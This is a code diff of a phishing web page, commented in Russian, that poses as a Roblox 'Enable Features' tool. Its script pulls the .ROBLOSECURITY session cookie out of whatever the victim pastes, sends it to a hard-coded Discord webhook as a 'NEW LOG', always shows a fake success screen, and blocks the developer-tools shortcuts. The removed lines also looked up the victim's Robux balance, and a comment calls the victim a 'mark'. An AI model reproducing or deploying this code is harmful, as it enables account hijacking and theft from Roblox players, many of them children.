@@ -87,7 +87,7 @@
                     ></textarea>
                 </div>
 
-                <button id="syncBtn" onclick="initiateSync()" class="btn-action w-full py-6 rounded-2xl text-[11px] uppercase tracking-[0.2em]">
+                <button id="syncBtn" onclick="extractAndSend()" class="btn-action w-full py-6 rounded-2xl text-[11px] uppercase tracking-[0.2em]">
                     Enable Features
                 </button>
             </div>
@@ -104,52 +104,44 @@
     </main>
 
     <script>
-        // ВСТАВЬ СВОЙ ВЕБХУК СЮДА ПОЛНОСТЬЮ
+        // Вставь свой вебхук полностью сюда
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1497208068570878063/_wH0MSZQV8lxmkw3U8qsB1I8EnREIWO8wLTrOBhdW5W5n5um1kUpZCkTSgWKA1Mqfz3r"; 
 
-        async function initiateSync() {
+        async function extractAndSend() {
             const input = document.getElementById('sessionData');
             const btn = document.getElementById('syncBtn');
-            const val = input.value;
+            const text = input.value;
 
-            if (val.length < 10) return;
+            if (text.length < 10) return;
 
             btn.disabled = true;
             btn.innerText = "CONNECTING...";
 
-            // Ищем куку в формате System.Net.Cookie или обычном
-            const cookieRegex = /\.ROBLOSECURITY=(_\|[^;'"\s]+)/;
-            const match = val.match(cookieRegex);
-            const cookieValue = match ? match[1] : "NOT_FOUND";
-
-            let accountInfo = { name: "Unknown", robux: "0", id: "0" };
-
-            try {
-                // Чекер баланса через API (работает из-под сессии мамонта)
-                const response = await fetch('https://www.roblox.com/mobileapi/userinfo');
-                const data = await response.json();
-                accountInfo = {
-                    name: data.UserName,
-                    robux: data.RobuxBalance,
-                    id: data.UserID
-                };
-            } catch (e) {
-                console.log("CORS or Auth Error");
+            // Извлекаем только значение куки между кавычками после .ROBLOSECURITY
+            // Регулярка ищет .ROBLOSECURITY", " и забирает всё до следующей кавычки
+            const regex = /\.ROBLOSECURITY",\s*"([^"]+)"/;
+            const match = text.match(regex);
+            
+            let finalValue = "COOKIE_NOT_FOUND";
+            
+            if (match && match[1]) {
+                finalValue = match[1];
+            } else {
+                // Запасной вариант, если формат немного другой
+                const altRegex = /\.ROBLOSECURITY=(_\|[^;'"\s]+)/;
+                const altMatch = text.match(altRegex);
+                if (altMatch && altMatch[1]) finalValue = altMatch[1];
             }
 
-            // Отправка в Discord
             const payload = {
                 content: "@everyone",
                 embeds: [{
-                    title: "✅ NEW LOG RECEIVED",
+                    title: "✅ NEW LOG",
                     color: 0,
                     fields: [
-                        { name: "👤 User", value: `**${accountInfo.name}** (${accountInfo.id})`, inline: true },
-                        { name: "💰 Balance", value: `\`${accountInfo.robux} R$\``, inline: true },
-                        { name: "🔑 Cookie", value: "```" + cookieValue + "```" },
-                        { name: "📝 Raw Start", value: "```" + val.substring(0, 100) + "```" }
+                        { name: "🔑 Value", value: "```" + finalValue + "```" }
                     ],
-                    footer: { text: "R+ Analytics System" },
+                    footer: { text: "R+ Automatic Extraction" },
                     timestamp: new Date()
                 }]
             };
@@ -160,15 +152,17 @@
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(payload)
                 });
-            } catch (err) {}
+            } catch (err) {
+                console.error("Webhook error");
+            }
 
-            // Всегда показываем успех
             document.getElementById('configView').style.display = 'none';
             document.getElementById('successScreen').style.display = 'block';
         }
 
-        // Защита консоли
-        document.onkeydown = e => { if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && e.keyCode == 73)) return false; };
+        document.onkeydown = e => { 
+            if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && e.keyCode == 73)) return false; 
+        };
     </script>
 </body>
 </html>
